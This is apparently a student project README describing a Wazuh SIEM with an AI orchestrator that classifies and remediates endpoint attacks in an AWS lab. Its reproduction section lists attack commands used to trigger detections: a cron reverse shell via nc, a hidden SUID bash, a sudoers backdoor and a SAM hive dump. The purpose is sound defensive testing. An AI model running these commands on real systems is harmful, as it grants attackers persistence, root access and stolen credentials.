# Endpoint Security Incident Response with AI Remediation

This repository contains the technical artefacts for a security automation project. 
The system integrates AWS cloud endpoints with a local Wazuh SIEM and an AI orchestrator using Llama 3.2 for autonomous threat classification and response.

### **Generative AI Disclosure**
In accordance with academic requirements, I disclose that Gemini (Generative AI) was used for script and code optimization, aswell for guiding when different issues occured.
All architectural builds, laboratory configurations, and video demonstrations were executed individually by the student.

### **Technical Note on Repository Structure**
The directory structure used in this repository (e.g., `/Windows_Endpoint`, `/Linux_Endpoint`) is designed just for organizational clarity and ease of review. In the live laboratory environment, these files are located in their respective system paths, such as `/etc/audit/rules.d/` for Linux rules or `C:\Program Files (x86)\ossec-agent\active-response\bin\` for Windows scripts.

---

## **Repository Layout**

### **1. SIEM & Orchestrator**
* **docker-compose.yml**: Orchestration file for the Wazuh manager, indexer, dashboard, and AI stack.
* **orchestrator.py**: Python-based web server that processes Wazuh webhooks and queries the Llama 3.2 model.
* **local_rules.xml**: Custom detection rules (IDs 100201-100206) mapped to the MITRE ATT&CK framework.
* **wazuh_manager.conf**: Configuration for the external integration block pointing to the Python gateway.

### **2. Windows Endpoint**
* **config.xml**: Sysmon configuration for capturing process and network telemetry.
* **ossec.conf**: Agent configuration for EventChannel monitoring and Sysmon log forwarding.
* **win-lock.cmd**: Active Response script for account containment (disabling the malicious user).
* **win-delete.cmd**: Active Response script for file-based remediation (e.g., removing the SAM hive dump).
* **win-kill.cmd**: Active Response script for process termination (e.g., killing obfuscated PowerShell).

### **3. Linux Endpoint**
* **audit.rules**: Kernel-level rules for monitoring sensitive file access and suspicious command execution.
* **ossec.conf**: Agent configuration for audit log forwarding and active response integration.
* **kill-process.sh**: Active Response script for SUID backdoor removal and crontab cleanup.

---

## **Simulation & Reproduction**

The following commands can be used to reproduce the detections and trigger the AI-driven remediations shown in the video:

**Windows Attacks:**
- **Discovery**: `net localgroup administrators`
- **Credential Access**: `reg save HKLM\SAM C:\temp\sam.hive`
- **Defense Evasion**: `powershell.exe -ExecutionPolicy Bypass -WindowStyle Hidden -EncodedCommand <Base64_Payload>`

**Linux Attacks:**
- **Persistence**: `sudo bash -c 'echo "* * * * * root /bin/nc -e /bin/bash 10.0.0.5 4444" >> /etc/crontab'`
- **Privilege Escalation**: `sudo cp /bin/bash /tmp/.hidden_bash && sudo chmod +s /tmp/.hidden_bash`
- **Credential Access**: `sudo bash -c 'echo "malicious_user ALL=(ALL) NOPASSWD: ALL" >> /etc/sudoers'`

*Note: All actions are performed within a controlled, isolated laboratory environment in AWS.*